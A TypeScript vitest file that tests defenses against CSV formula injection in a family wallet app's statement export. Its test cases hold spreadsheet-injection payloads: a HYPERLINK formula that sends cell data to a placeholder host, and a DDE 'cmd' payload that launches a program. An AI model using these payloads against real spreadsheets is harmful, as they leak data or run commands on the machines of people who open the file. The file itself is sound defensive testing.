import { describe, expect, it } from 'vitest';
import { toStatementCsv, type ActivityTxn } from '@/lib/wallet/activity';

/**
 * "Download statement" wrote whatever a ledger row's description said into the
 * CSV, quoting only commas, quotes and newlines. A cell that begins with
 * = + - @ (or a tab or carriage return) is a FORMULA to Excel, Sheets and
 * Numbers, and the descriptions are other people's words: a card purchase is
 * described by the merchant's own name (Stripe `merchant_data.name`), a spend
 * request by whoever asked. So `=HYPERLINK("https://…?"&B2,"Open")` in a
 * description became a live link — or worse — in the parent's spreadsheet.
 *
 * The support-ticket export already guards this (lib/admin/tickets-csv.ts,
 * C1-S9-105): an apostrophe in front makes the cell text. The statement now
 * does the same to the cells people write — Description and Child — and to no
 * others: Amount and Balance are the app's own signed numbers, and "-0.50"
 * has to stay a number a spreadsheet can sum.
 */

const row = (over: Partial<ActivityTxn> & { childName?: string | null }): ActivityTxn & { childName?: string | null } => ({
  id: 'r1', child_wallet_id: 'c1', type: 'card_spend', status: 'completed', direction: 'debit',
  amount_cents: 50, description: 'Snacks', created_at: '2026-06-25T14:30:00Z', childName: 'Mia', ...over,
});

/** Split one CSV data line into cells, honouring RFC 4180 quoting. */
function cells(line: string): string[] {
  const out: string[] = [];
  let cur = '';
  let quoted = false;
  for (let i = 0; i < line.length; i += 1) {
    const ch = line[i];
    if (quoted) {
      if (ch === '"' && line[i + 1] === '"') { cur += '"'; i += 1; } else if (ch === '"') quoted = false; else cur += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ',') { out.push(cur); cur = ''; } else cur += ch;
  }
  out.push(cur);
  return out;
}

const COL = { description: 3, child: 4, amount: 6, balance: 8 } as const;
const dataLine = (r: ActivityTxn & { childName?: string | null }) => cells(toStatementCsv([r]).split('\r\n')[1]);

describe('a description someone else wrote is text, not a formula', () => {
  it.each([
    ['=HYPERLINK("https://example.test/?"&B2,"Open")'],
    ['+1+cmd|\' /C calc\'!A0'],
    ['-2+3'],
    ['@SUM(A1:A9)'],
    ['\tTAB-LED'],
    ['\rCR-LED'],
  ])('%j is written with an apostrophe in front', (description) => {
    expect(dataLine(row({ description }))[COL.description]).toBe(`'${description}`);
  });

  it('the same goes for the child column', () => {
    expect(dataLine(row({ childName: '=1+1' }))[COL.child]).toBe("'=1+1");
  });

  it('a merchant name that is a formula and has a comma is still one quoted cell', () => {
    const line = toStatementCsv([row({ description: '=A1,B1' })]).split('\r\n')[1];
    expect(line).toContain(`"'=A1,B1"`);
    expect(cells(line)).toHaveLength(9);
  });
});

describe('everything else is left exactly as it was', () => {
  it('an ordinary description and name are untouched', () => {
    const line = dataLine(row({ description: 'Corner Books', childName: 'Mia' }));
    expect(line[COL.description]).toBe('Corner Books');
    expect(line[COL.child]).toBe('Mia');
  });

  it('a formula character anywhere but the start is just a character', () => {
    expect(dataLine(row({ description: 'Snacks = $5 + tax @ store' }))[COL.description]).toBe('Snacks = $5 + tax @ store');
  });

  it('a debit amount and a negative balance stay numbers a spreadsheet can sum', () => {
    const line = dataLine(row({ amount_cents: 50, direction: 'debit' }));
    expect(line[COL.amount]).toBe('-0.50');
    expect(line[COL.balance]).toBe('-0.50');
  });

  it('an empty description and a missing child are empty cells, not an apostrophe', () => {
    const line = dataLine(row({ description: null, childName: null }));
    expect(line[COL.description]).toBe('');
    expect(line[COL.child]).toBe('');
  });
});
